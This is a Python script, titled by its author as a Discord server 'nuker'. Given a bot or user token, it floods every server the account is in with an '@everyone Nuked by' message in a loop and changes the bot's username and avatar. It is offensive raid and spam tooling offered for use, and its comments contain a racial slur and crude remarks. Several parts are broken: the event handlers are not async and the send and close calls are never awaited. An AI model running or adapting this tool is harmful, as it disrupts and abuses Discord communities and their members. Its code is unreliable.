# server fucker / # nuker
import requests
import discord

Footer = ("@everyone Nuked by http://dsc.gg/reaperxyz https://media.discordapp.net/attachments/1227299397142970369/1228750697185677454/513ad497-bd26-48d2-9f80-fe5c8c5209cd.gif?ex=662d2e43&is=661ab943&hm=7af13f40be039a942c2f2bd0c080960b61fbf8181f742be0084430f85b7bc4ca&=  https://media.discordapp.net/attachments/1227299397142970369/1228749619584962682/deadbolt-indie-game.gif?ex=662d2d42&is=661ab842&hm=0627e082b2cc31f59487e7829d1c0b3bf476c89cffc67c718e452ebed776a33a&=  https://media.discordapp.net/attachments/1227299397142970369/1228751069140615269/1bbbf01b-74b7-414a-b565-6705e55f191f.gif?ex=662d2e9b&is=661ab99b&hm=68fcd92f0a99be509c2bb95f5ea28198d163cd3399f5ae1cccb786f43a4ccf6a&=")
intents = discord.Intents.default()
intents.typing = False
intents.presences = False
bot = discord.Client(intents=intents)
client = bot

# Are you horny?
# JJ IS YES
# Makese sense
# nigga told me stfu :dS

def send_user(token , message):
    try:
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }

        response = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
        response.raise_for_status()
        guilds = response.json()

        for guild in guilds:
            guild_id = guild["id"]
            channels_response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers)
            channels_response.raise_for_status()
            channels = channels_response.json()
            text_channels = [channel for channel in channels if channel["type"] == 0]  # 0 represents text channels
            if text_channels:
                channel_id = text_channels[0]["id"]  # Select the first text channel
                message_payload = {
                    "content": message
                }
                send_message_response = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", 
                                                      headers=headers, json=message_payload)
                send_message_response.raise_for_status()

        return "Message sent to all servers."
    except requests.exceptions.RequestException as e:
        return f"Error sending message: {e}"

def send_bot(token, message):

    @client.event
    def on_ready():
        print('Logged in as', client.user)
        # Iterate over all guilds (servers) the bot is in
        for guild in client.guilds:
            # Iterate over all channels in the guild
            for channel in guild.text_channels:
                try:
                    # Send the message to the channel
                    channel.send(message, Footer)
                except Exception as e:
                    print(f"Failed to send message to {guild.name}: {e}")

        client.close()

    client.run(token)

def check_token_type(token):
    client = discord.Client()

    try:
        client.run(token, bot=True)
        user = client.user
        # Check if the user retrieved is a bot
        is_bot = user.bot
        client.close()
        return "Bot" if is_bot else "User"
    except discord.errors.LoginFailure:
        return "Invalid token"
    except Exception as e:
        return f"Error: {e}"

def sendservers(token , message):
    
    token_type = check_token_type(token)

    if token_type == "Bot":
        send_bot(token= token , message= message)

    if token_type == "User":
        send_user(token= token , message= message)

def rape_servers(token , message , ammount, new_username, pfp_url):
    token_type = check_token_type(token)
    max = 0
    if token_type == "Bot":
        change_profile_bot(token= token , pfp_url= pfp_url, new_username= new_username)
    while max < ammount:
        max += 1
        sendservers(token= token, message= message)

# This should work now lol , on to the next features

def change_profile_bot(token, pfp_url, new_username):

    @client.event
    def on_ready():
        print(f'Logged in as {client.user}')

        for guild in client.guilds:
            if guild.me.guild_permissions.administrator:
                print(f'Changing profile in {guild.name}...')
                response = requests.get(pfp_url)
                if response.status_code == 200:
                    with open('pfp.png', 'wb') as f:
                        f.write(response.content)
                    with open('pfp.png', 'rb') as f:
                        client.user.edit(avatar=f.read())
                else:
                    print(f"Failed to download profile picture from {pfp_url}")

                client.user.edit(username=new_username)

        client.close()

    client.run(token)
